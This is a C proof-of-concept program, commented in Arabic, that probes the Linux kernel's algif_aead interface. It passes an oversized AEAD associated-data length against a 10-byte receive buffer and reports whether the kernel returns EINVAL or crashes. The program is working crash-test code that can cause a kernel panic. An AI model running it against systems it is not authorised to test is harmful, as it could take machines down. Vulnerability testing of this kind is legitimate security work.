/*
 * PoC: algif_aead — aead_assoclen > RX buffer → NULL deref in memcpy_sglist
 *
 * الهدف: إثبات أن تمرير aead_assoclen أكبر من RX buffer
 *        يؤدي إلى kernel panic أو EINVAL (إذا كان محمياً)
 *
 * النتيجة المتوقعة إذا الثغرة موجودة:
 *   - Kernel panic / BUG / NULL dereference في dmesg
 *   - أو: process killed بـ SIGSEGV من kernel
 *
 * النتيجة إذا الثغرة غير موجودة (محمية):
 *   - recvmsg يرجع -EINVAL بشكل نظيف
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/if_alg.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

/* AES-128-GCM: key=16, iv=12, tag=16 */
#define KEY_LEN   16
#define IV_LEN    12
#define TAG_LEN   16

static void print_result(const char *test, int ret, int expected_errno) {
    if (ret == 0) {
        printf("  [%s] recvmsg returned 0 (unexpected)\n", test);
    } else if (ret < 0) {
        if (errno == expected_errno) {
            printf("  [%s] ✅ PROTECTED — got errno %d (%s)\n",
                   test, errno, strerror(errno));
        } else if (errno == EFAULT || errno == ENOMEM) {
            printf("  [%s] ⚠️  Got errno %d (%s) — possible corruption\n",
                   test, errno, strerror(errno));
        } else {
            printf("  [%s] ❓ Got errno %d (%s)\n",
                   test, errno, strerror(errno));
        }
    } else {
        printf("  [%s] recvmsg returned %d bytes\n", test, ret);
    }
}

/*
 * اختبار: aead_assoclen > RX buffer
 * السؤال: هل يرجع EINVAL نظيفاً أم يتعطل الـ kernel؟
 */
static int test_assoclen_gt_rxbuf(void) {
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "gcm(aes)",
    };

    int sfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sfd < 0) { perror("socket"); return -1; }

    if (bind(sfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(sfd); return -1;
    }

    /* Set key */
    uint8_t key[KEY_LEN] = {0};
    if (setsockopt(sfd, SOL_ALG, ALG_SET_KEY, key, KEY_LEN) < 0) {
        perror("setsockopt key"); close(sfd); return -1;
    }

    /* Set authsize */
    if (setsockopt(sfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
                   NULL, TAG_LEN) < 0) {
        perror("setsockopt authsize"); close(sfd); return -1;
    }

    int cfd = accept(sfd, NULL, 0);
    if (cfd < 0) { perror("accept"); close(sfd); return -1; }

    /* === TX: إرسال بيانات كبيرة مع aead_assoclen كبير === */
    uint32_t assoclen = 4000;          /* aead_assoclen — كبير */
    size_t   tx_size  = assoclen + 84; /* TX data = assoclen + plaintext */

    uint8_t *tx_buf = calloc(1, tx_size);
    if (!tx_buf) { close(cfd); close(sfd); return -1; }

    /* CMSG: IV + OP + ASSOCLEN */
    struct {
        struct cmsghdr  cmsg_iv;
        struct af_alg_iv aiv;
        uint8_t          iv_data[IV_LEN];

        /* padding للـ alignment */
        uint8_t _pad1[CMSG_ALIGN(sizeof(struct cmsghdr) +
                      sizeof(struct af_alg_iv) + IV_LEN) -
                      (sizeof(struct cmsghdr) +
                       sizeof(struct af_alg_iv) + IV_LEN)];

        struct cmsghdr  cmsg_op;
        uint32_t        op;

        uint8_t _pad2[CMSG_ALIGN(sizeof(struct cmsghdr) +
                      sizeof(uint32_t)) -
                      (sizeof(struct cmsghdr) + sizeof(uint32_t))];

        struct cmsghdr  cmsg_assoc;
        uint32_t        assoc;
    } cmsg_buf;

    memset(&cmsg_buf, 0, sizeof(cmsg_buf));

    /* IV cmsg */
    cmsg_buf.cmsg_iv.cmsg_level  = SOL_ALG;
    cmsg_buf.cmsg_iv.cmsg_type   = ALG_SET_IV;
    cmsg_buf.cmsg_iv.cmsg_len    = CMSG_LEN(sizeof(struct af_alg_iv) + IV_LEN);
    cmsg_buf.aiv.ivlen            = IV_LEN;

    /* OP cmsg */
    cmsg_buf.cmsg_op.cmsg_level  = SOL_ALG;
    cmsg_buf.cmsg_op.cmsg_type   = ALG_SET_OP;
    cmsg_buf.cmsg_op.cmsg_len    = CMSG_LEN(sizeof(uint32_t));
    cmsg_buf.op                   = ALG_OP_ENCRYPT;

    /* ASSOCLEN cmsg */
    cmsg_buf.cmsg_assoc.cmsg_level = SOL_ALG;
    cmsg_buf.cmsg_assoc.cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cmsg_buf.cmsg_assoc.cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cmsg_buf.assoc                  = assoclen;

    struct iovec iov = { .iov_base = tx_buf, .iov_len = tx_size };
    struct msghdr msg_tx = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = &cmsg_buf,
        .msg_controllen = sizeof(cmsg_buf),
    };

    ssize_t sent = sendmsg(cfd, &msg_tx, 0);
    if (sent < 0) {
        perror("sendmsg");
        free(tx_buf); close(cfd); close(sfd);
        return -1;
    }

    /* === RX: buffer صغير جداً (أصغر من aead_assoclen) === */
    uint8_t rx_buf[10];  /* 10 bytes فقط بينما assoclen=4000 */
    struct iovec iov_rx = { .iov_base = rx_buf, .iov_len = sizeof(rx_buf) };
    struct msghdr msg_rx = {
        .msg_iov    = &iov_rx,
        .msg_iovlen = 1,
    };

    printf("\n[TEST] aead_assoclen(%u) > RX buffer(%zu)\n",
           assoclen, sizeof(rx_buf));
    printf("  TX sent: %zd bytes\n", sent);
    printf("  Calling recvmsg with tiny RX buffer...\n");

    ssize_t ret = recvmsg(cfd, &msg_rx, 0);
    print_result("assoclen>rxbuf", (int)ret, EINVAL);

    free(tx_buf);
    close(cfd);
    close(sfd);
    return 0;
}

/*
 * اختبار baseline: aead_assoclen == 0 (يجب أن يعمل بشكل طبيعي)
 * للتأكد أن الـ setup صحيح قبل اختبار الثغرة
 */
static int test_baseline_normal(void) {
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "gcm(aes)",
    };

    int sfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sfd < 0) { perror("socket"); return -1; }
    if (bind(sfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(sfd); return -1;
    }

    uint8_t key[KEY_LEN] = {0};
    setsockopt(sfd, SOL_ALG, ALG_SET_KEY, key, KEY_LEN);
    setsockopt(sfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, TAG_LEN);

    int cfd = accept(sfd, NULL, 0);
    if (cfd < 0) { perror("accept"); close(sfd); return -1; }

    /* TX: plaintext صغير بدون AAD */
    uint8_t plaintext[32] = {0};

    char cmsg_buf[CMSG_SPACE(sizeof(struct af_alg_iv) + IV_LEN) +
                  CMSG_SPACE(sizeof(uint32_t)) +
                  CMSG_SPACE(sizeof(uint32_t))];
    memset(cmsg_buf, 0, sizeof(cmsg_buf));

    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;

    /* IV */
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + IV_LEN);
    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cmsg);
    aiv->ivlen = IV_LEN;
    cmsg = (struct cmsghdr *)((char *)cmsg + CMSG_ALIGN(cmsg->cmsg_len));

    /* OP */
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_OP;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_ENCRYPT;
    cmsg = (struct cmsghdr *)((char *)cmsg + CMSG_ALIGN(cmsg->cmsg_len));

    /* ASSOCLEN = 0 */
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = 0;

    struct iovec iov = { .iov_base = plaintext, .iov_len = sizeof(plaintext) };
    struct msghdr msg_tx = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = cmsg_buf,
        .msg_controllen = sizeof(cmsg_buf),
    };
    sendmsg(cfd, &msg_tx, 0);

    /* RX: كبير بما يكفي */
    uint8_t rx_buf[64];
    struct iovec iov_rx = { .iov_base = rx_buf, .iov_len = sizeof(rx_buf) };
    struct msghdr msg_rx = { .msg_iov = &iov_rx, .msg_iovlen = 1 };

    printf("\n[BASELINE] Normal operation (assoclen=0, rx_buf=64)\n");
    ssize_t ret = recvmsg(cfd, &msg_rx, 0);
    if (ret > 0)
        printf("  ✅ BASELINE OK — encrypted %zd bytes\n", ret);
    else
        printf("  ❌ BASELINE FAILED — errno %d (%s)\n", errno, strerror(errno));

    close(cfd);
    close(sfd);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║  algif_aead PoC — aead_assoclen vs RX buffer        ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");

    /* تحقق أن AF_ALG متاح */
    int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        printf("❌ AF_ALG not available: %s\n", strerror(errno));
        printf("   Need: CONFIG_CRYPTO_USER_API_AEAD=y\n");
        return 1;
    }
    close(fd);
    printf("✅ AF_ALG available\n");

    test_baseline_normal();
    test_assoclen_gt_rxbuf();

    printf("\n[NOTE] Check dmesg for kernel warnings/panics:\n");
    printf("  sudo dmesg | tail -20\n");

    return 0;
}
